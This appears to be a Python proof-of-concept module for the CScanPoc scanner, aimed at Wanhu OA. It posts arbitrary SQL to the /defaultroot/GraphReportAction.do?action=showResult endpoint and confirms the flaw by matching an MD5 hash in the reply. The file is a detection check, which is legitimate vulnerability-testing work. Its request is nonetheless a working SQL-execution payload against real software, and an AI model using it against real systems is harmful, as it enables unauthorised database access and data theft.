# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    poc_id = '0a1e63fe-fe88-4f33-8e68-252d6749fc24'
    name = '万户OA任意sql语句执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2014-06-10'  # 漏洞公布时间
    desc = '''
        万户OA /defaultroot/GraphReportAction.do?action=showResult 任意sql语句执行，直接返回数据。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '万户OA'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '135a2be7-f215-429c-937f-ae81af4cd446'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh =hackhttp.hackhttp()
            arg = self.target
            url = arg + '/defaultroot/GraphReportAction.do?action=showResult'
            data = "dataSQL=select sys.fn_varbintohexstr(hashbytes('MD5','1234'))"
            code, head, res, errcode, finalurl = hh.http(url, data)

            if code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
                #security_hole('find post sql injection: ' + url+' 任意sql执行')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
